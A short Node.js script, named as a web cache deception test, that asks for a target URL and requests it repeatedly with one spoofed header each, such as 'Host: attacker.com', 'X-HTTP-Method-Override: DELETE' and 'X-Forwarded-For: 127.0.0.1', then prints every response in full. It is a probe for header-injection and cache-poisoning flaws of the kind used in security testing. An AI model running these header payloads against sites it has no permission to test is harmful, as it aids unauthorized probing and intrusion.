const readline = require('readline');
const fetch = require('node-fetch');

async function testWebCacheDeception() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Enter your target website URL: ', async (websiteUrl) => {
    rl.close();

    const additionalHeaders = process.argv[2];

    const headersToTest = [
      {
        name: 'Host',
        value: 'attacker.com'
      },
      {
        name: 'X-Forwarded-Host',
        value: 'victim.com'
      },
      {
        name: 'X-Forwarded-For',
        value: '127.0.0.1'
      },
      {
        name: 'X-Original-URL',
        value: '/'
      },
      {
        name: 'X-Rewrite-URL',
        value: '/'
      },
      {
        name: 'X-Forwarded-Proto',
        value: 'https'
      },
      {
        name: 'X-Forwarded-Server',
        value: 'attacker-server'
      },
      {
        name: 'X-Forwarded-Port',
        value: '8080'
      },
      {
        name: 'X-HTTP-Method-Override',
        value: 'DELETE'
      },
      {
        name: 'X-HTTP-Method',
        value: 'PUT'
      },
      {
        name: 'X-Original-Method',
        value: 'POST'
      },
      {
        name: 'X-Forwarded',
        value: '127.0.0.1'
      }
      // Add any other headers you want to test here
    ];

    // Parse additional headers
    if (additionalHeaders) {
      const customHeaders = additionalHeaders.split(',').map(header => header.trim());
      customHeaders.forEach(header => {
        headersToTest.push({
          name: header,
          value: 'test-value' // You may adjust the value for custom headers
        });
      });
    }

    try {
      const results = [];
      const timeoutDuration = 10000; // 10 seconds timeout

      const requests = headersToTest.map(async (header) => {
        const headers = {
          [header.name]: header.value
        };

        console.log(`Testing ${header.name} header...`);
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeoutDuration);

        try {
          const response = await fetch(websiteUrl, { headers, signal: controller.signal });
          clearTimeout(timeoutId);

          const result = {
            name: header.name,
            status: response.status,
            headers: response.headers,
            body: await response.text()
          };

          results.push(result);
        } catch (error) {
          results.push({
            name: header.name,
            error: error.message
          });
        }
      });

      await Promise.all(requests);

      results.forEach(result => {
        console.log(`=== ${result.name} Header ===`);
        if (result.error) {
          console.log(`Error: ${result.error}`);
        } else {
          console.log(`Response Status: ${result.status}`);
          console.log(`Response Headers:`);
          console.log(result.headers);
          console.log(`Response Body:`);
          console.log(result.body);
        }
        console.log('-------------------------------------');
      });

      console.log("Testing completed.");
    } catch (error) {
      console.error('An error occurred:', error);
    }
  });
}

// Call the function to start testing
testWebCacheDeception();
